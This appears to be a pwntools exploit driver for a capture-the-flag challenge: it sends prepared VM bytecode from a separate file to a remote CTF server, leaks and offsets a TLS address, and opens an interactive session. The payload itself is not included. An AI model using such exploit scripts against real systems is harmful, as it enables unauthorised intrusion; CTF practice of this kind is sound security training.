from pwn import *
#io = process(["./myP1G","stdout"])
io = remote("challenge21.play.potluckctf.com",31337)

#gdb.attach(io,gdbscript="break *(vm+2484)")
with open("exp_remote","rb") as vmcode:
    # the offsets in exp_remote is found using the docker container and gdb
    code = vmcode.read()
    io.sendline(code)

# for debugging purposes
leak = u64(io.recv(6).ljust(8,b"\x00"))
log.info("TLS: " + hex(leak-0x21c5a0))
log.info("initial: " + hex(leak+0x1210))

io.interactive()
